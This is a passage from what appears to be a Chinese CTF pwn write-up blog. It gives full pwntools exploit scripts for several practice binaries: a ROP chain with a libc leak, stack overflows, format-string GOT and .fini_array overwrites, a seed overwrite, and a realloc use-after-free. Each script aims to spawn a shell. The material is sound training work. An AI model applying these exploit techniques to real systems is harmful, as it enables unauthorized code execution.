<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">54991</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">    payload += p64(poprdi)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=elf)</span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_got)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png" alt="image-20201209175028067"></p>
<h2 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11.反应釜开关控制"></a>11.反应釜开关控制</h2><p><img src="/posts/5600bec/image-20201123091050404.png" alt="image-20201123091050404"></p>
<h3 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h3><p>先查看一下保护。</p>
<p><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
<p>只开启了堆栈不可执行。</p>
<p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
<p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
<h3 id="思路及利用-7"><a href="#思路及利用-7" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
<p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./reactionkettle&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">49151</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">easy = p.recv(<span class="number">8</span>)</span><br><span class="line">easy =  <span class="built_in">int</span>(easy,<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(easy)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">normal = p.recv(<span class="number">8</span>)</span><br><span class="line">normal  =  <span class="built_in">int</span>(normal,<span class="number">16</span>) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>+p64(normal)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;is:&#x27;</span>)</span><br><span class="line">shell = p.recv(<span class="number">8</span>)</span><br><span class="line">shell = <span class="built_in">int</span>(shell,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(shell)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="12-实时数据监测"><a href="#12-实时数据监测" class="headerlink" title="12.实时数据监测"></a>12.实时数据监测</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083325372.png" alt="image-20201125083325372"></p>
<p>checksec:</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083521011.png" alt="image-20201125083521011"></p>
<h3 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125083728103.png" alt="image-20201125083728103"></p>
<p>显然目标就是将key的值改为35795746，也就是0x02223322。这里有用到ida一个技巧，ida里字符串是以编码的值存储的，找到对应的值，选中，按下a就可以转为字符串显示。这里的”The location of key is %08x, and its value is %08x,not the 0x02223322. (╯°Д°)╯︵ ┻━┻\n”就是这样得来的。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084015380.png" alt="image-20201125084015380"></p>
<p>这显然是一个格式化字符串漏洞。</p>
<h3 id="思路及利用-8"><a href="#思路及利用-8" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>根据上述分析，只需要输入一个格式化字符串，将&amp;key改为0x02223322就可以。</p>
<p>那么首先，寻找格式化字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084321047.png" alt="image-20201125084321047"></p>
<p>可以看到偏移为12.</p>
<p>使用ida查询key的地址</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084627078.png" alt="image-20201125084627078"></p>
<p>然后借助fmtstr_payload快速构造格式化字符串。<code>fmtstr_payload(12,&#123;0x804A048:0x02223322&#125;)</code></p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./实时数据监测&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">52658</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804A048</span>:<span class="number">0x02223322</span>&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084651226.png" alt="image-20201125084651226"></p>
<h2 id="13-dice-game"><a href="#13-dice-game" class="headerlink" title="13.dice_game"></a>13.dice_game</h2><p><img src="/posts/5600bec/image-20201123094300324.png" alt="image-20201123094300324"></p>
<h3 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下</p>
<p><img src="/posts/5600bec/image-20201123094345375.png" alt="image-20201123094345375"></p>
<p>通过ida反编译阅读源码</p>
<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
<p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
<p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
<h3 id="思路及利用-9"><a href="#思路及利用-9" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
<p><strong>需要注意的是，由于exp使用python编写，但这里需要用到c的函数。需要用上一点混合编程的技巧。</strong></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
<h2 id="14-satck2"><a href="#14-satck2" class="headerlink" title="14.satck2"></a>14.satck2</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180156575.png" alt="image-20201209180156575"></p>
<h2 id="16-greeting-150"><a href="#16-greeting-150" class="headerlink" title="16.greeting-150"></a>16.greeting-150</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
<p>首先checksec</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
<h3 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。之后的返回值调用printf函数，显然这里存在的是格式化字符串漏洞。</p>
<h3 id="思路及利用-10"><a href="#思路及利用-10" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>要利用这个格式化字符串漏洞，首先需要找到字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085535031.png" alt="image-20201209085535031"></p>
<p>可以看出输如的aaaa并没有在一个偏移内，需要填充两个字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085719874.png" alt="image-20201209085719874"></p>
<p>对于aaaa来说，偏移是12.知道偏移后，就可以用格式化字符串漏洞做到任意地址的读写。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090009791.png" alt="image-20201209090009791"></p>
<p>注意到程序中有调用system函数，那么只需要修改某个got为system函数的plt就可以调用system函数了。</p>
<p>考虑到传参的问题，这个被修改的got最好能获得输入。于是在输入函数中发现strlen函数比较适合。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090448566.png" alt="image-20201209090448566"></p>
<p>只要修改strlen函数的got为system的plt，再想办法返回main重新输入”/bin/sh”就可以得到shell了。</p>
<p>接下来就是如何返回main的问题。</p>
<p><code>.fini_array</code> 节存放了指向终止代码的函数指针，在main函数调用后被触发。所以把.fini_array[0]改为mian的地址即可。</p>
<p>在ida中使用快捷键ctrl+s可以看到fini_array的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209091546640.png" alt="image-20201209091546640"></p>
<p>同时也可以得到如下地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fini_got &#x3D; 0x8049934  </span><br><span class="line">main_addr &#x3D; 0x80485ED  </span><br><span class="line">strlen_got &#x3D; 0x8049A54  </span><br><span class="line">system_plt &#x3D; 0x8048490 </span><br></pre></td></tr></table></figure>

<p>由于可输入的只有64字节。格式化字符串需要设计一下。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209092156695.png" alt="image-20201209092156695"></p>
<p>可以看到，fini_array的内容的地址与main只有两个字节不一样。只需要修改后两个字节，用到格式化字符<code>%hn</code>.</p>
<p>strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。因此，我们一共需要写三个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr &#x3D; [  </span><br><span class="line">   0x85ED,  </span><br><span class="line">   0x8490,0x804  </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>

<p>由于是小端序，因此，我们要在fini_got写入2字节数据arr[0]；在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./greeting-150&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;220.249.52.133&#x27;,38405)</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">system_got = <span class="number">0x8049A48</span></span><br><span class="line">main_addr = <span class="number">0x80485ED</span>  </span><br><span class="line">init_array = <span class="number">0x8049934</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span></span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += p32(strlen_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(init_array)</span><br><span class="line">arr = [  </span><br><span class="line">   <span class="number">0x85ED</span>,  </span><br><span class="line">   <span class="number">0x8490</span>,</span><br><span class="line">   <span class="number">0x804</span>  </span><br><span class="line">]</span><br><span class="line">num = arr[<span class="number">2</span>] - <span class="number">32</span>  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">1</span>] - arr[<span class="number">2</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">0</span>] - arr[<span class="number">1</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%14$hn&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(payload)  )</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
<h2 id="17-secret-file"><a href="#17-secret-file" class="headerlink" title="17.secret_file"></a>17.secret_file</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180235402.png" alt="image-20201209180235402"></p>
<h2 id="18-supermarket"><a href="#18-supermarket" class="headerlink" title="18.supermarket"></a>18.supermarket</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100516746.png" alt="image-20201221100516746"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100534999.png" alt="image-20201221100534999"></p>
<h3 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171344578.png" alt="image-20201222171344578"></p>
<p>程序实现了商品的添加、删除、查询、更改。其中商品又名称、价格、描述，可以修改价格和描述。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172654517.png" alt="image-20201222172654517"></p>
<p>程序所用堆的结构大致为：其中，description的chunk大小是可以被我们控制的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172643751.png" alt="image-20201222172643751"></p>
<p>漏洞出现在修改描述上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171556274.png" alt="image-20201222171556274"></p>
<p>realloc函数作用大概如下：</p>
<p>1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。<br>2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。<br>3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。</p>
<p>也就是说，如果在修改描述时申请的空间比之前大，原来的会被free掉，但是这里没有把新的地址赋给指向描述的指针，存在UAF漏洞。</p>
<h3 id="思路及利用-11"><a href="#思路及利用-11" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>保护并没有限制修改got表，而且程序也提供了输出函数。那么大致的思路就是，先泄露got地址，确定真实地址、libc版本，找到system函数地址，修改got表项为system，输入“/bin/sh”获得shell，这里选择atoi比较方便。</p>
<p>接下来就是如何实现的问题：</p>
<ul>
<li>先申请一个description大于fastbin大小的chunk（0x80）的商品0.</li>
<li>再申请一个较小的商品1（用来分隔，如果不用商品1来分隔，则realoc直接扩展商品0的descript的大小至新size）。</li>
<li>修改商品0的描述，大小改为0x90.出发realoc函数。</li>
<li>申请商品2，描述大小为0x80.这样商品2首先申请结构体就是商品0的描述。（商品的结构体为0x1c）</li>
<li>这样修改商品0的描述就是修改商品2，首先将商品2的<code>*description</code>改为atoi的got地址，输出。</li>
<li>获得system地址，修改商品2的描述就是修改atoi的got表项。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222175100455.png" alt="image-20201222175100455"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./supermarket&#x27;)  </span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">48203</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;price:&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>) 